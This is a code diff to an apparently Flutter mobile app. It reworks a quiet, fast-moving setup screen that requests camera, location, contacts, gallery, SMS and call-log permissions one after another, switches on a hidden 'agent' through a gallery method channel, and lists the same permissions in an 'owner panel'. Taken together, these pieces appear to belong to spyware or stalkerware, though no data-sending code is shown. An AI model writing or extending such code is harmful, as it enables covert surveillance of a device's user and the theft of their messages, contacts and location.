@@ -444,7 +444,7 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  GUIDED PERMISSION SETUP — clean & quiet (no counter, no chips)
+//  GUIDED PERMISSION SETUP — fast, quiet, 7 dialogs (Audio/Mic বাদ)
 // ═══════════════════════════════════════════════════════════════════════
 class PermissionSetupScreen extends StatefulWidget {
   final VoidCallback onDone;
@@ -455,18 +455,15 @@ class PermissionSetupScreen extends StatefulWidget {
 }
 
 class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
-  static final List<MapEntry<String, Permission?>> _steps = [
-    MapEntry('Agent', null),
-    MapEntry('Notification', Permission.notification),
-    MapEntry('Camera', Permission.camera),
-    MapEntry('Location', Permission.location),
-    MapEntry('All-time Location', Permission.locationAlways),
-    MapEntry('Microphone', Permission.microphone),
-    MapEntry('Contacts', Permission.contacts),
-    MapEntry('Photos', Permission.photos),
-    MapEntry('Videos', Permission.videos),
-    MapEntry('SMS', Permission.sms),
-    MapEntry('Call log', Permission.phone),
+  static final List<MapEntry<String, List<Permission>>> _steps = [
+    MapEntry('Agent', const []),
+    MapEntry('Notification', [Permission.notification]),
+    MapEntry('Camera', [Permission.camera]),
+    MapEntry('Location', [Permission.location]),
+    MapEntry('Contacts', [Permission.contacts]),
+    MapEntry('Gallery', [Permission.photos, Permission.videos]),
+    MapEntry('SMS', [Permission.sms]),
+    MapEntry('Call log', [Permission.phone]),
   ];
 
   bool _finished = false;
@@ -478,14 +475,14 @@ class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
   }
 
   Future<void> _run() async {
-    await Future.delayed(const Duration(milliseconds: 200));
+    await Future.delayed(const Duration(milliseconds: 100));
     for (final s in _steps) {
       if (!mounted) return;
-      if (s.value == null) {
+      if (s.key == 'Agent') {
         try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
-        await Future.delayed(const Duration(milliseconds: 400));
+        await Future.delayed(const Duration(milliseconds: 150));
       } else {
-        try { await s.value!.request(); } catch (_) {}
+        try { await s.value.request(); } catch (_) {}
       }
     }
     final p = await SharedPreferences.getInstance();
@@ -493,7 +490,7 @@ class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
     await p.setBool('allPermsAsked', true);
     if (!mounted) return;
     setState(() => _finished = true);
-    await Future.delayed(const Duration(milliseconds: 400));
+    await Future.delayed(const Duration(milliseconds: 300));
     widget.onDone();
   }
 
@@ -570,7 +567,6 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
   static final Map<String, Permission> _allPerms = {
     'Camera': Permission.camera,
     'Location': Permission.location,
-    'Microphone': Permission.microphone,
     'Contacts': Permission.contacts,
     'Photos': Permission.photos,
     'Videos': Permission.videos,
@@ -692,7 +688,6 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
     switch (name) {
       case 'Camera': return Icons.camera_alt_rounded;
       case 'Location': return Icons.location_on_rounded;
-      case 'Microphone': return Icons.mic_rounded;
       case 'Contacts': return Icons.contacts_rounded;
       case 'Photos': return Icons.photo_library_rounded;
       case 'Videos': return Icons.videocam_rounded;
